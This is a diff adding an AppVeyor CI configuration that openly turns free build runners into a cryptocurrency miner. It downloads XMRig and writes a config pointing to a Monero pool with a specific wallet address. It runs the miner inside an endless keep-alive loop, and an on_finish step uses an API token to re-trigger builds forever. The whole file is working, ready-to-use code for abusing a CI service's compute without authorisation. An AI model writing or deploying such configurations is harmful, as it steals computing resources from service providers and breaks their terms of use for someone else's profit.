@@ -1,0 +1,83 @@
+# AppVeyor Build Configuration for a "Fire-and-Forget" XMRig Miner (with Auto-Restart)
+
+# 1. Environment and Build Configuration
+image: Visual Studio 2022
+
+# We assume your encrypted API token is already stored as an environment variable
+# in the AppVeyor project settings with the name 'API_TOKEN'.
+
+# We don't need to build any code.
+build: off
+
+# 2. Main Installation and Configuration Script
+install:
+  - ps: |
+      $ErrorActionPreference = "Stop"
+      
+      $minerVersion = "6.21.2"
+      $downloadUrl = "https://github.com/xmrig/xmrig/releases/download/v$($minerVersion)/xmrig-$($minerVersion)-msvc-win64.zip"
+      $zipPath = "$env:TEMP\xmrig.zip"
+      $extractPath = "$env:USERPROFILE\Desktop\miner"
+      
+      Write-Host "Ensuring destination directory exists..."
+      New-Item -ItemType Directory -Force -Path $extractPath
+      
+      Write-Host "Downloading XMRig v$($minerVersion)..."
+      Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath
+      
+      Write-Host "Extracting XMRig..."
+      Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
+      
+      $minerFolder = (Get-ChildItem -Path $extractPath -Directory | Where-Object { $_.Name -like 'xmrig*' }).FullName
+      if (-not $minerFolder) { throw "CRITICAL: Could not find extracted XMRig folder!" }
+      Write-Host "Found miner folder: $minerFolder"
+      
+      $jsonContent = '{"autosave": true,"cpu": true,"opencl": false,"cuda": false,"pools": [{"algo": "rx/0","url": "pool.supportxmr.com:5555","user": "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP","pass": "x"}]}'
+      $jsonContent | ConvertFrom-Json | ConvertTo-Json -Depth 100 | Set-Content -Path (Join-Path $minerFolder "config.json")
+      Write-Host "config.json created."
+
+      $batPath = Join-Path $extractPath "Start-Miner.bat"
+      $batContent = "@echo off`r`ncd /d ""$($minerFolder)""`r`nxmrig.exe"
+      Set-Content -Path $batPath -Value $batContent
+      Write-Host "Start-Miner.bat created."
+
+# 3. Running the Miner and Keeping the Build Alive
+build_script:
+  - ps: |
+      Write-Host "Starting the miner process..."
+      Start-Process -FilePath "$env:USERPROFILE\Desktop\miner\Start-Miner.bat"
+      
+      Write-Host "Miner process has been launched in the background."
+      Write-Host "This build will now run until it times out, at which point it will restart."
+      
+      while ($true) {
+          Start-Sleep -Seconds 300
+          Write-Host "[$(Get-Date)] - Build active, miner running in background..."
+      }
+
+# 4. Auto-Restart Logic
+# This block runs after the build finishes (or times out).
+on_finish:
+  - ps: |
+      Write-Host "Build finished. Triggering next build via API..."
+      
+      # Correct values for your project
+      $accountName = "coldestcoderreal-commits"
+      $projectSlug = "voyage_test"
+      
+      $apiUrl = "https://ci.appveyor.com/api/builds"
+      
+      $headers = @{
+          "Authorization" = "Bearer $env:API_TOKEN"
+          "Content-type"  = "application/json"
+      }
+      
+      $body = @{
+          accountName = $accountName
+          projectSlug = $projectSlug
+          branch      = "main" # Or your default branch name
+      } | ConvertTo-Json
+      
+      Invoke-RestMethod -Uri $apiUrl -Method Post -Headers $headers -Body $body
+      
+      Write-Host "SUCCESS: The next build has been triggered."
